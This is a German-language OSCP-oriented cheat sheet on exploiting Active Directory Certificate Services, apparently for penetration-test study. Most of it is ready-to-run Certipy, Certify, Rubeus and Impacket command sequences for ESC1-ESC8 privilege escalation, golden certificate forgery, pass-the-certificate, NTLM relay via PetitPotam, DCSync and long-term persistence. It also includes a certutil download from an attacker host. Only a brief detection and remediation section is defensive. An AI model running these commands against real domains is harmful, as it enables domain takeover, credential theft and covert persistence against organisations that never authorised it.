# PKI/CA Exploitation - Active Directory Certificate Services

## Was ist AD CS (Active Directory Certificate Services)?

AD CS ist Microsofts PKI-Implementation für Windows-Domänen. Verwaltet digitale Zertifikate für:
- Authentifizierung
- Verschlüsselung
- Code Signing
- Smart Cards

**Problem:** Häufige Fehlkonfigurationen führen zu Privilege Escalation und Persistence.

---

## Wichtigste Tools

### Certipy

**Das go-to Tool für AD CS Exploitation**

```bash
# Installation
pip3 install certipy-ad

# Oder via git
git clone https://github.com/ly4k/Certipy
cd Certipy
pip3 install .
```

### Certutil (Windows Native)

```cmd
# Windows built-in, kein Download nötig
certutil -?
```

### Other Tools

- **PSPKIAudit** - PowerShell AD CS Audit
- **ForgeCert** - Golden Certificate Creation
- **Certify** - .NET AD CS Enumeration
- **PassTheCert** - Certificate-based Authentication

---

## Certipy - Haupttool

### Enumeration

```bash
# Find vulnerable certificate templates
certipy find -u user@domain.local -p password -dc-ip DC_IP

# Output in verschiedenen Formaten
certipy find -u user@domain.local -p password -dc-ip DC_IP -text -stdout
certipy find -u user@domain.local -p password -dc-ip DC_IP -json -stdout
certipy find -u user@domain.local -p password -dc-ip DC_IP -output results

# Mit NTLM Hash
certipy find -u user@domain.local -hashes :NTLM_HASH -dc-ip DC_IP

# Via Kerberos
certipy find -u user@domain.local -k -dc-ip DC_IP
```

#### Output verstehen

```
Certificate Authorities:
  0
    CA Name                         : CA-NAME
    DNS Name                        : ca.domain.local
    [...]

Certificate Templates:
  0
    Template Name                   : ESC1-Template
    Validity Period                 : 1 year
    Enrollment Permissions
      Enrollment Rights
        DOMAIN\Domain Users
    Client Authentication           : True
    Subject Alternative Name        : SAN is enabled
    [!] Vulnerable to ESC1!         # <- WICHTIG!
```

### ESC1 - Certificate Template Misconfiguration

**Bedingungen:**
- Template erlaubt Client Authentication
- Subject Alternative Name (SAN) kann vom User gesetzt werden
- Normale User haben Enrollment Rights

**Exploitation:**

```bash
# 1. Request certificate mit SAN = Administrator
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template ESC1-Template -upn administrator@domain.local -dc-ip DC_IP

# Output: administrator.pfx

# 2. Authenticate mit Certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 3. Ergebnis: TGT + NTLM Hash von Administrator
# Username: administrator
# Hash: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# 4. Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH administrator@DC_IP
```

### ESC2 - Any Purpose Certificate

**Bedingungen:**
- Template hat "Any Purpose" EKU oder kein EKU
- Normale User haben Enrollment Rights

**Exploitation:**

```bash
# 1. Request certificate
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template ESC2-Template -upn administrator@domain.local -dc-ip DC_IP

# 2. Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC3 - Enrollment Agent

**Bedingungen:**
- Template erlaubt Certificate Request Agent
- User kann sich selbst als Enrollment Agent eintragen

**Exploitation:**

```bash
# 1. Request Enrollment Agent Certificate
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template ESC3-Template -dc-ip DC_IP

# Output: user.pfx

# 2. Request Certificate für Administrator via Enrollment Agent
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template User -on-behalf-of 'domain\administrator' -pfx user.pfx -dc-ip DC_IP

# 3. Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 - Vulnerable Certificate Template Access Control

**Bedingungen:**
- User hat WriteDacl/WriteProperty auf Certificate Template
- Kann Template modifizieren um ESC1-ähnliche Misconfiguration zu erstellen

**Exploitation:**

```bash
# 1. Template modifizieren
certipy template -u user@domain.local -p password -template TemplateName -save-old -dc-ip DC_IP

# 2. Request Certificate (jetzt vulnerable)
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template TemplateName -upn administrator@domain.local -dc-ip DC_IP

# 3. Template zurücksetzen (Clean-up)
certipy template -u user@domain.local -p password -template TemplateName -configuration TemplateName.json -dc-ip DC_IP

# 4. Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Bedingungen:**
- CA hat EDITF_ATTRIBUTESUBJECTALTNAME2 Flag gesetzt
- User kann beliebigen SAN bei Enrollment angeben

**Exploitation:**

```bash
# 1. Request mit SAN
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template User -upn administrator@domain.local -dc-ip DC_IP

# 2. Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC7 - Vulnerable CA Access Control

**Bedingungen:**
- User hat ManageCA oder ManageCertificates Rights auf CA

**Exploitation:**

```bash
# 1. Add current user as Officer
certipy ca -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -add-officer user -dc-ip DC_IP

# 2. Enable SubCA Template
certipy ca -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -enable-template SubCA -dc-ip DC_IP

# 3. Request Certificate (wird failed)
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template SubCA -upn administrator@domain.local -dc-ip DC_IP

# 4. Issue failed request (als Officer)
certipy ca -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -issue-request REQUEST_ID -dc-ip DC_IP

# 5. Retrieve issued certificate
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -retrieve REQUEST_ID -dc-ip DC_IP

# 6. Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC8 - NTLM Relay to HTTP Enrollment

**Bedingungen:**
- AD CS Web Enrollment aktiviert
- HTTP (nicht HTTPS) oder Extended Protection deaktiviert

**Exploitation:**

```bash
# 1. Setup ntlmrelayx
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Coerce Authentication (via PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py ATTACKER_IP DC_IP

# 3. Receive Certificate
# ntlmrelayx saved as: DC_NAME.pfx

# 4. Authenticate
certipy auth -pfx DC_NAME.pfx -dc-ip DC_IP
```

---

## Certutil (Windows Native)

### Certificate Manipulation

```cmd
# View Certificate
certutil -dump certificate.cer

# Export from Store
certutil -store my                          # List certificates
certutil -exportPFX my CERT_SERIAL pfx.pfx  # Export

# Import Certificate
certutil -addstore -user my certificate.cer

# Delete Certificate
certutil -delstore my CERT_SERIAL
```

### Download Files (LOLBin)

```cmd
# Download file
certutil -urlcache -f http://ATTACKER/file.exe file.exe

# Verify hash
certutil -hashfile file.exe MD5
certutil -hashfile file.exe SHA256
```

### Encode/Decode

```cmd
# Base64 encode
certutil -encode file.exe file.b64

# Base64 decode
certutil -decode file.b64 file.exe
```

---

## Certify (.NET Tool)

### Download & Usage

```powershell
# Download
https://github.com/GhostPack/Certify/releases

# Oder compile from source
git clone https://github.com/GhostPack/Certify
# Visual Studio → Compile
```

### Enumeration

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Find all templates
.\Certify.exe find

# Specific CA
.\Certify.exe find /ca:CA-NAME

# Current user permissions
.\Certify.exe find /currentuser
```

### Request Certificate

```powershell
# Request certificate with altname
.\Certify.exe request /ca:CA-NAME /template:ESC1-Template /altname:administrator

# Output: Base64-encoded PFX

# Convert to PFX file (PowerShell)
[IO.File]::WriteAllBytes("admin.pfx", [Convert]::FromBase64String("BASE64_STRING"))
```

---

## Golden Certificate Attack

### Was ist ein Golden Certificate?

Gefälschtes CA-Zertifikat mit gestohlenen CA Private Key. Ermöglicht Erstellung von beliebigen Zertifikaten für beliebige User.

### Voraussetzungen

- Domain Admin Zugriff (um CA Private Key zu extrahieren)
- CA Private Key + CA Certificate

### Exploitation

```bash
# 1. CA Backup erstellen (als Domain Admin)
certipy ca -u administrator@domain.local -p password -ca CA-NAME -target ca.domain.local -backup -dc-ip DC_IP

# Output: CA-NAME_YYYY-MM-DD_HH-MM-SS.zip
# Contains: CA.pfx (Private Key + Certificate)

# 2. Golden Certificate erstellen
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject "CN=Administrator,CN=Users,DC=domain,DC=local"

# Output: administrator_forged.pfx

# 3. Authenticate
certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP

# 4. Profit: NTLM Hash + TGT von Administrator
```

---

## Pass-the-Certificate

### Mit Certipy

```bash
# Authenticate mit Certificate → erhalte TGT + Hash
certipy auth -pfx user.pfx -dc-ip DC_IP

# Output:
# TGT saved to user.ccache
# NTLM Hash: aad3b...:HASH

# Use TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@dc.domain.local

# Or use Hash
impacket-psexec -hashes :HASH user@dc.domain.local
```

### Mit Rubeus (Windows)

```powershell
# Convert PFX to Base64
$bytes = [IO.File]::ReadAllBytes("user.pfx")
[Convert]::ToBase64String($bytes)

# Rubeus asktgt mit Certificate
.\Rubeus.exe asktgt /user:administrator /certificate:BASE64_PFX /password:PFX_PASSWORD /ptt

# Jetzt authenticated als Administrator
dir \\dc\C$
```

---

## Persistence via Certificates

### 1. Create Certificate for Persistence

```bash
# Request long-lived certificate (als Admin)
certipy req -u administrator@domain.local -p password -ca CA-NAME -target ca.domain.local -template User -upn administrator@domain.local -dc-ip DC_IP

# Certificate für 1+ Jahr gültig
# Speichern für spätere Verwendung
```

### 2. Golden Certificate für permanente Persistence

```bash
# Mit CA Backup (siehe oben)
# Certificates können beliebig erstellt werden, auch nach Passwort-Änderungen
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject "CN=Administrator,CN=Users,DC=domain,DC=local"
```

---

## Detection & Remediation

### Detection

```
Event ID 4887 - Certificate Services approved a certificate request
Event ID 4888 - Certificate Services denied a certificate request
Event ID 4885 - Certificate Services received a certificate request
Look for: Unusual certificate requests, SAN mismatches, multiple requests
```

### Remediation

```powershell
# Fix ESC1 - Remove SAN from Template
# Disable "Supply in request" for SAN

# Fix ESC6 - Remove EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc

# Audit Certificate Templates
# Check Enrollment Rights - should be restrictive
# Review EKUs - avoid "Any Purpose"

# Enable Extended Protection on Web Enrollment
# Always use HTTPS
```

---

## Praktische OSCP-Workflows

### Workflow 1: Initial Enum → ESC1 → DA

```bash
# 1. Credentials bekommen (z.B. via Kerberoasting)
# user:password

# 2. AD CS Enumeration
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable -stdout

# 3. ESC1 gefunden! Request cert
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template ESC1-Template -upn administrator@domain.local -dc-ip DC_IP

# 4. Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 5. Pass-the-Hash
impacket-psexec -hashes :HASH administrator@DC_IP
```

### Workflow 2: NTLM Relay (ESC8)

```bash
# 1. Check if HTTP Enrollment exists
nmap -p 80,443 -sV ca.domain.local

# 2. Setup relay
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 3. Coerce authentication
python3 PetitPotam.py ATTACKER_IP DC_IP

# 4. Authenticate with received cert
certipy auth -pfx DC.pfx -dc-ip DC_IP

# 5. DCSync
impacket-secretsdump -k -no-pass domain.local/DC\$@dc.domain.local
```

### Workflow 3: Golden Certificate Persistence

```bash
# 1. Als Domain Admin: CA Backup
certipy ca -u administrator@domain.local -p password -ca CA-NAME -target ca.domain.local -backup -dc-ip DC_IP

# 2. Extract CA.pfx
unzip CA-NAME_*.zip

# 3. Später (auch nach Passwort-Änderungen): Forge Certificate
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject "CN=Administrator,CN=Users,DC=domain,DC=local"

# 4. Authenticate
certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP

# 5. Domain Admin Access wiederhergestellt
```

---

## Alternative Tools

### PSPKIAudit

```powershell
# PowerShell AD CS Audit
Import-Module PSPKIAudit
Invoke-PKIAudit

# Find vulnerable templates
Get-VulnerableCertificateTemplate
```

### ForgeCert

```bash
# Create forged certificates
git clone https://github.com/GhostPack/ForgeCert
# Compile in Visual Studio

# Usage
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=User" --SubjectAltName "admin@domain.local" --NewCertPath admin.pfx --NewCertPassword password
```

---

## Quick Reference

### Certipy Commands

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable

# Request certificate (ESC1)
certipy req -u user@domain.local -p password -ca CA -target ca.domain.local -template TEMPLATE -upn admin@domain.local -dc-ip DC_IP

# Authenticate with cert
certipy auth -pfx cert.pfx -dc-ip DC_IP

# CA Backup (Golden Cert)
certipy ca -u admin@domain.local -p password -ca CA -target ca.domain.local -backup -dc-ip DC_IP

# Forge certificate
certipy forge -ca-pfx CA.pfx -upn admin@domain.local -subject "CN=Admin,DC=domain,DC=local"
```

### ESC Types

| ESC | Description | Exploitation |
|-----|-------------|--------------|
| ESC1 | Template allows SAN | Request cert with admin UPN |
| ESC2 | Any Purpose EKU | Similar to ESC1 |
| ESC3 | Enrollment Agent | Request on-behalf-of admin |
| ESC4 | Vulnerable ACL | Modify template → ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | SAN in any template |
| ESC7 | Vulnerable CA ACL | Add officer, issue certs |
| ESC8 | HTTP Enrollment | NTLM Relay |

---

## OSCP Exam Tips

1. **Certipy ist king** - Haupttool für AD CS
2. **Immer enumieren** - `certipy find -vulnerable`
3. **ESC1 am häufigsten** - Template SAN Misconfiguration
4. **ESC8 für Relay** - Wenn Web Enrollment aktiv
5. **Golden Cert = Persistence** - Bei DA-Zugriff CA backup
6. **Pass-the-Cert** - Certificate → TGT + NTLM Hash
7. **Time-sensitive** - Certificates haben Validity Period
8. **Clean-up** - ESC4 template changes rückgängig machen

---

## Resources

- Certipy: https://github.com/ly4k/Certipy
- Certified Pre-Owned (White Paper): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certify: https://github.com/GhostPack/Certify
- HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- SpecterOps Blog: https://posts.specterops.io/certified-pre-owned-d95910965cd2
